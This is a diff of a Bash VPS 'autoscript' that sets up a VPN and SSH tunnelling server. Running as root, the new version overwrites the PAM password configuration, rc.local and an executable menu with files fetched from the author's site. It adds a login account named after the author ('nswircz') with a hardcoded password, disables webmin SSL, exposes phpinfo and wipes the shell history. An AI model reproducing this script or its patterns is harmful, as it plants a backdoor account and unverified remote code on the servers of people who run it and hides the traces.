@@ -1,60 +1,44 @@
 #!/bin/bash
+# ******************************************
+# Program: Autoscript Setup VPS 2017
+# Website: my.zvpn.net
+# Developer: Muhammad Hafis Bin Norasmi
+# Nickname: NSWIRCZ
+# Date: 11-05-2016
+# Last Updated: 05-08-2017
+# ******************************************
+# START SCRIPT ( rzvpn.net )
+myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
+myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
+if [ $USER != 'root' ]; then
+echo "Sorry, for run the script please using root user"
+exit 1
+fi
+if [[ "$EUID" -ne 0 ]]; then
+echo "Sorry, you need to run this as root"
+exit 2
+fi
+if [[ ! -e /dev/net/tun ]]; then
+echo "TUN is not available"
+exit 3
+fi
+echo "
+AUTOSCRIPT BY RZVPN.NET
 
-# go to root
-cd
-apt-get update
-apt-get --assume-yes install libxml-parser-perl
-apt-get --assume-yes install nginx php5 php5-fpm php5-cli php5-mysql php5-mcrypt
+PLEASE CANCEL ALL PACKAGE POPUP
+
+TAKE NOTE !!!"
 clear
-lee-connect
-wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/mysql.sh
-chmod +x mysql.sh
-./mysql.sh
+echo "START AUTOSCRIPT"
 clear
-lee-connect
-wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/mysql_secure.sh
-chmod +x mysql_secure.sh
-./mysql_secure.sh
-clear
-useradd -m vps
-mkdir -p /home/vps/public_html
-chown -R mysql:mysql /var/lib/mysql/
-chmod -R 755 /var/lib/mysql/
-rm /etc/nginx/sites-enabled/default
-rm /etc/nginx/sites-available/default
-lee-connect
-wget -O /etc/nginx/nginx.conf https://github.com/llxxdd/sys/tree/master/lib/db/jig/nginx.conf
-echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
-lee-connect
-wget -O /etc/nginx/conf.d/vps.conf https://github.com/llxxdd/sys/tree/master/lib/db/jig/vps-lee-83.conf
-sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
-echo "<?php phpinfo() ?>" > /home/vps/public_html/info.php
-service php5-fpm restart
-service nginx restart
-clear
-apt-get -y install zip unzip
-cd /home/vps/public_html
-lee-connect
-wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/Leepanelocs.zip
-unzip Leepanelocs.zip
-rm -f Leepanelocs.zip
-clear
-chown -R www-data:www-data /home/vps/public_html
-chmod -R g+rw /home/vps/public_html
-clear
-sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
-php5enmod mcrypt
-rm -r /root/ocs
-wget -O /home/vps/public_html/index.html "https://github.com/llxxdd/sys/tree/master/lib/db/jig/index.html"
-clear
-cd
-rm .sh
-rm mysql.sh
-rm mysql_secure.sh
-rm -rf ~/.bash_history && history -c
-clear
+echo "SET TIMEZONE KUALA LUMPUT GMT +8"
 ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
 clear
+echo "
+ENABLE IPV4 AND IPV6
+
+COMPLETE 1%
+"
 echo ipv4 >> /etc/modules
 echo ipv6 >> /etc/modules
 sysctl -w net.ipv4.ip_forward=1
@@ -62,98 +46,113 @@ sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
 sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
 sysctl -p
 clear
-wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/dotdeb.gpg
-wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/jcameron-key.asc
-cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
-cat jcameron-key.asc | apt-key add -;rm jcameron-key.asc
+echo "
+REMOVE SPAM PACKAGE
+
+COMPLETE 10%
+"
 apt-get -y --purge remove samba*;
 apt-get -y --purge remove apache2*;
 apt-get -y --purge remove sendmail*;
 apt-get -y --purge remove postfix*;
 apt-get -y --purge remove bind*;
 clear
-apt-get update;apt-get -y upgrade;apt-get -y install wget curl
+echo "
+UPDATE AND UPGRADE PROCESS
+
+PLEASE WAIT TAKE TIME 1-5 MINUTE
+"
+sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
+wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
+apt-get update;
+apt-get -y autoremove;
+apt-get -y install wget curl;
+echo "
+INSTALLER PROCESS PLEASE WAIT
+
+TAKE TIME 5-10 MINUTE
+"
+# script
+wget -O /usr/local/bin/menu "http://rzvpn.net/random/menu"
+wget -O /etc/pam.d/common-password "http://rzvpn.net/random/common-password"
+chmod +x /etc/pam.d/common-password
+chmod +x /usr/local/bin/menu 
+# fail2ban & exim & protection
+apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
+wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
+cd ddos-deflate-master && ./install.sh
+service exim4 stop;sysv-rc-conf exim4 off;
+# webmin
+apt-get -y install webmin
+sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
+# dropbear
+apt-get -y install dropbear
+wget -O /etc/default/dropbear "http://rzvpn.net/random/dropbear"
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
-if [ -d '/usr/local/ddos' ]; then
-	echo; echo; echo "Please un-install the previous version first"
-	exit 0
-else
-	mkdir /usr/local/ddos
-fi
-clear
-echo; echo 'Installing DOS-Deflate 0.6'; echo
-echo; echo -n 'Downloading source files...'
-wget -q -O /usr/local/ddos/ddos.conf http://www.inetbase.com/scripts/ddos/ddos.conf
-echo -n '.'
-wget -q -O /usr/local/ddos/LICENSE http://www.inetbase.com/scripts/ddos/LICENSE
-echo -n '.'
-wget -q -O /usr/local/ddos/ignore.ip.list http://www.inetbase.com/scripts/ddos/ignore.ip.list
-echo -n '.'
-wget -q -O /usr/local/ddos/ddos.sh http://www.inetbase.com/scripts/ddos/ddos.sh
-chmod 0755 /usr/local/ddos/ddos.sh
-cp -s /usr/local/ddos/ddos.sh /usr/local/sbin/ddos
-echo '...done'
-echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
-/usr/local/ddos/ddos.sh --cron > /dev/null 2>&1
-echo '.....done'
-echo; echo 'Installation has completed.'
-echo 'Config file is at /usr/local/ddos/ddos.conf'
-echo 'Please send in your comments and/or suggestions to Lee Dzung Autoscript'
+# squid3
 apt-get -y install squid3
-lee-connect
-wget -O /etc/squid3/squid.conf https://github.com/llxxdd/sys/tree/master/lib/db/jig/squid.conf
+wget -O /etc/squid3/squid.conf "http://rzvpn.net/random/squid.conf"
+wget -O /etc/squid/squid.conf "http://rzvpn.net/random/squid.conf"
 sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
+sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
+# openvpn
 apt-get -y install openvpn
-cd /etc/openvpn/
-lee-connect
-wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
-lee-connect
-wget -O /etc/iptables.up.rules https://github.com/llxxdd/sys/tree/master/lib/db/jig/iptables.up.rules
-sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
-sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
-iptables-restore < /etc/iptables.up.rules
-lee-connect
-wget -O /home/vps/public_html/client.ovpn https://github.com/llxxdd/sys/tree/master/lib/db/jig/client.ovpn
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn;cd
-lee-connect
-wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/cronjob.tar
-tar xf cronjob.tar;mv uptimes.php /home/vps/public_html/
-mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
-chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
-useradd -m -g users -s /bin/bash sshvpn
-echo "sshvpn:123456" | chpasswd
-sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
-sed -i 's/Port 22/Port  22/g' /etc/ssh/sshd_config
-service ssh restart
-apt-get -y install dropbear
-sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110"/g' /etc/default/dropbear
-echo "/bin/false" >> /etc/shells
-service ssh restart
-service dropbear restart
-apt-get -y install fail2ban;
-service fail2ban restart
-lee-connect
-wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/webmin.sh
-chmod +x webmin.sh
-./webmin.sh
-lee-connect
-wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/pptp.sh
-chmod +x pptp.sh
-./pptp.sh
-lee-connect
-echo "0 0 * * * root /usr/bin/user-expire" > /etc/cron.d/user-expire
-echo "0 */12 * * * root /sbin/reboot" > /etc/cron.d/reboot
-echo "* * * * * service dropbear restart" > /etc/cron.d/dropbear
-rm $0
+wget -O /etc/openvpn/openvpn.tar "http://rzvpn.net/random/openvpn.tar"
+cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/rc.local "http://rzvpn.net/random/rc.local";chmod +x /etc/rc.local
+#wget -O /etc/iptables.up.rules "http://rzvpn.net/random/iptables.up.rules"
+#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+#iptables-restore < /etc/iptables.up.rules
+# nginx
+apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
+rm /etc/nginx/sites-enabled/default
+rm /etc/nginx/sites-available/default
+wget -O /etc/php/7.0/fpm/pool.d/www.conf "http://rzvpn.net/random/www.conf"
+mkdir -p /home/vps/public_html
+echo "<pre>Setup by meow | telegram @nswircz | whatsapp +60183902905</pre>" > /home/vps/public_html/index.php
+echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
+wget -O /etc/nginx/conf.d/vps.conf "http://rzvpn.net/random/vps.conf"
+sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
+# etc
+wget -O /home/vps/public_html/client.ovpn "http://rzvpn.net/random/client.ovpn"
+wget -O /etc/motd "http://rzvpn.net/random/motd"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+useradd -m -g users -s /bin/bash nswircz
+echo "nswircz:rzp" | chpasswd
+echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
+cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 clear
+# restart service
+service ssh restart
 service openvpn restart
-service squid3 restart
-service ssh restart
 service dropbear restart
-service nginx start
+service nginx restart
+service php7.0-fpm restart
+service webmin restart
+service squid restart
+service fail2ban restart
 clear
-cd ~/
+# END SCRIPT ( rzvpn.net )
+echo "========================================"  | tee -a log-install.txt
+echo "Service Autoscript VPS (RZ Mobile Service)"  | tee -a log-install.txt
+echo "----------------------------------------"  | tee -a log-install.txt
+echo ""  | tee -a log-install.txt
+echo "nginx : http://$myip:80"   | tee -a log-install.txt
+echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt
+echo "Squid3 : 8080"  | tee -a log-install.txt
+echo "OpenSSH : 22"  | tee -a log-install.txt
+echo "Dropbear : 443"  | tee -a log-install.txt
+echo "OpenVPN  : TCP 1194 (client config : http://$myip/client.ovpn)"  | tee -a log-install.txt
+echo "Fail2Ban : [on]"  | tee -a log-install.txt
+echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
+echo "Menu : type menu to check menu script"  | tee -a log-install.txt
+echo ""  | tee -a log-install.txt
+echo "----------------------------------------"
+echo "LOG INSTALL  --> /root/log-install.txt"
+echo "----------------------------------------"
+echo "========================================"  | tee -a log-install.txt
+echo "      PLEASE REBOOT TAKE EFFECT !"
+echo "========================================"  | tee -a log-install.txt
 cat /dev/null > ~/.bash_history && history -c
